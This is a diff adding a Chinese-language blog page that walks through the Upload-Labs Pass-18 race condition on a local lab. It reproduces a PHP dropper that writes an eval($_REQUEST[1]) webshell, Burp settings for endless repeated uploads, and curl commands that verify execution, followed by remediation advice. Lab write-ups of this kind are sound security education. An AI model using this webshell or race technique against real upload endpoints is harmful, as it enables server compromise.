@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-18 条件竞争 Writeup - gz2008的技术博客</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    h3 { margin-top: 24px; color: #334155; font-size: 1.05rem; }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+
+    <h1>Upload-Labs Pass-18：利用条件竞争保留临时 PHP 文件</h1>
+    <div class="tags">
+      <span class="tag"># Upload-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># File Upload</span>
+      <span class="tag"># 条件竞争</span>
+      <span class="tag"># Burp Attack</span>
+    </div>
+
+    <p>Pass-18 虽然只允许最终保留 <code>jpg</code>、<code>png</code>、<code>gif</code>，但服务端先把文件移动到最终上传目录，随后才检查扩展名并删除非法文件。上传与删除之间存在一个短暂的时间窗口；并发访问此时已经落盘的 PHP 文件，就能让其中的代码先于 <code>unlink()</code> 执行。</p>
+
+    <h2>一、实验信息</h2>
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>靶场</td><td>本地 Upload-Labs</td></tr>
+      <tr><td>关卡</td><td>Pass-18</td></tr>
+      <tr><td>目标地址</td><td><code>http://127.0.0.1:8081/Pass-18/index.php</code></td></tr>
+      <tr><td>漏洞类型</td><td>文件上传与删除之间的条件竞争</td></tr>
+      <tr><td>上传文件名</td><td><code>2.php</code></td></tr>
+      <tr><td>竞争访问地址</td><td><code>http://127.0.0.1:8081/upload/2.php</code></td></tr>
+      <tr><td>生成结果</td><td><code>http://127.0.0.1:8081/upload/xiao.php</code></td></tr>
+      <tr><td>运行环境</td><td>Apache 2.4.68、PHP、Linux/WSL</td></tr>
+    </table>
+
+    <div class="note">本实验只针对本机 <code>127.0.0.1</code> 的授权靶场。验证时只执行固定 <code>echo</code> 语句，不执行系统命令。</div>
+
+    <h2>二、页面现象</h2>
+    <p>Pass-18 的任务是上传 WebShell，但直接上传 <code>2.php</code> 后会收到“只允许上传 jpg、png、gif 类型文件”的提示。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass18_page.png" alt="Upload-Labs Pass-18 页面直接上传 2.php 被扩展名检查拒绝">
+      <figcaption>非法扩展名最终会被删除，但删除发生在文件移动之后。</figcaption>
+    </figure>
+
+    <h2>三、漏洞根因</h2>
+    <p>本关的核心逻辑可以简化为：</p>
+
+    <pre><code>$ext_arr = array('jpg', 'png', 'gif');
+$file_name = $_FILES['upload_file']['name'];
+$upload_file = UPLOAD_PATH . '/' . $file_name;
+
+if (move_uploaded_file($temp_file, $upload_file)) {
+    if (in_array($file_ext, $ext_arr)) {
+        rename($upload_file, $img_path);
+    } else {
+        unlink($upload_file);
+    }
+}</code></pre>
+
+    <p>执行顺序决定了这里存在竞态窗口：</p>
+
+    <table>
+      <tr><th>顺序</th><th>服务端动作</th><th>文件状态</th></tr>
+      <tr><td>1</td><td><code>move_uploaded_file()</code> 写入 <code>upload/2.php</code></td><td>已存在且可访问</td></tr>
+      <tr><td>2</td><td>检查扩展名</td><td><code>php</code> 不在白名单</td></tr>
+      <tr><td>3</td><td><code>unlink()</code> 删除文件</td><td>恢复为不存在</td></tr>
+    </table>
+
+    <p>安全边界的问题不只是“扩展名检查在服务端”，而是危险文件先被放到了 Web 可访问目录。检查与删除不能撤销第 2 步窗口内已经发生的 PHP 执行。</p>
+
+    <h2>四、Burp 中的竞争请求</h2>
+    <p>从浏览器提交一次非法文件，将请求发送到 Burp 的 Attack。把 multipart 文件名改为 <code>2.php</code>，并在文件内容中放入一个先建立 <code>xiao.php</code> 的 PHP 探针。本次请求体为：</p>
+
+    <pre><code>&lt;?php
+fputs(fopen('xiao.php','w'), '&lt;?php eval($_REQUEST[1]);?&gt;');
+?&gt;</code></pre>
+
+    <figure>
+      <img src="assets/upload_labs_pass18_request.png" alt="Burp Attack 中配置 Pass-18 的 2.php 上传请求和无限重复">
+      <figcaption>请求把文件名设为 <code>2.php</code>，Attack 中未配置载荷位置并选择“无限重复”。</figcaption>
+    </figure>
+
+    <p>重点不是枚举用户名或密码，而是保持同一个上传请求高频发送。Burp Attack 的配置如下：</p>
+
+    <ul>
+      <li>请求目标：<code>http://127.0.0.1:8081</code>。</li>
+      <li>请求路径：<code>/Pass-18/index.php</code>。</li>
+      <li>multipart 文件名：<code>2.php</code>。</li>
+      <li>请求体：写入 <code>xiao.php</code> 的 PHP 代码。</li>
+      <li>载荷配置：选择“无限重复”，启动攻击。</li>
+    </ul>
+
+    <p>攻击运行后，在另一个标签页或客户端持续访问：</p>
+
+    <pre><code>http://127.0.0.1:8081/upload/2.php</code></pre>
+
+    <p>只要某次访问命中了“已经移动、尚未删除”的时间窗口，<code>2.php</code> 就会被 PHP 解析并执行，随后在上传目录中创建 <code>xiao.php</code>。竞争没有命中时，访问会显示 <code>404 Not Found</code>。</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass18_deleted.png" alt="竞争访问未命中时 upload/2.php 返回 404">
+      <figcaption>未命中窗口时 <code>2.php</code> 已被删除；竞态访问需要持续重复。</figcaption>
+    </figure>
+
+    <h2>五、验证 xiao.php</h2>
+    <p>生成后先检查 HTTP 状态：</p>
+
+    <pre><code>curl.exe -sS -I http://127.0.0.1:8081/upload/xiao.php</code></pre>
+
+    <p>实测返回：</p>
+
+    <pre><code>HTTP/1.1 200 OK
+Server: Apache/2.4.68 (Debian)
+Content-Type: text/html; charset=UTF-8</code></pre>
+
+    <p>文件确实位于靶场的 <code>upload</code> 目录，大小为 27 字节。然后用固定字符串验证 PHP 执行，不调用系统命令：</p>
+
+    <pre><code>curl.exe -sS -X POST \
+  --data-urlencode "1=echo 'PASS18_EXISTING_OK';" \
+  http://127.0.0.1:8081/upload/xiao.php</code></pre>
+
+    <p>响应为：</p>
+
+    <pre><code>PASS18_EXISTING_OK</code></pre>
+
+    <div class="success">可以确认：<code>upload/xiao.php</code> 已由条件竞争窗口中的 <code>2.php</code> 生成，HTTP 访问返回 <code>200</code>，PHP 代码执行并输出了固定标记。</div>
+
+    <h2>六、为什么单纯并发不是充分条件</h2>
+    <p>条件竞争依赖服务端在短时间内完成“写入”和“删除”，两个动作之间没有原子性。提高请求频率只能提高命中概率，不能保证一次成功，因此需要同时满足：</p>
+
+    <ul>
+      <li>上传请求足够频繁，使非法文件不断重新出现。</li>
+      <li>访问请求足够频繁，及时命中文件存在的时间窗口。</li>
+      <li>访问请求在文件仍可被 PHP 解析时到达，而不是仅仅看到静态文件。</li>
+      <li>目标目录允许脚本执行，且写入位置与访问路径一致。</li>
+    </ul>
+
+    <p>这类漏洞的根因不是“黑名单漏掉了某个后缀”，而是检查和清理之间缺少原子操作。即使扩展名检查逻辑本身没有遗漏，只要危险文件曾短暂可执行，仍然可能失败。</p>
+
+    <h2>七、修复建议</h2>
+    <ul>
+      <li>先把上传内容写入 Web 根目录之外的临时目录，完成类型、扩展名和内容校验后再安全移动。</li>
+      <li>由服务端生成随机文件名和安全扩展名，不直接使用客户端文件名。</li>
+      <li>上传目录关闭 PHP、CGI 等脚本执行权限，并限制目录访问方式。</li>
+      <li>对文件移动、校验和发布使用原子操作，避免用户请求访问到中间状态。</li>
+      <li>启用白名单、真实文件类型检测和图片重编码，并将权限限制在最小范围。</li>
+    </ul>
+
+    <h2>八、复盘</h2>
+    <p>Pass-18 的核心是时间差：服务端先把 <code>2.php</code> 移动到可访问目录，再进行扩展名检查并删除。Burp Attack 的“无限重复”负责持续制造临时文件，另一个并发请求负责在删除前访问它。命中后，<code>2.php</code> 执行并生成 <code>xiao.php</code>，从而证明上传成功与安全校验之间不能存在可被利用的可见状态。</p>
+  </main>
+</body>
+</html>
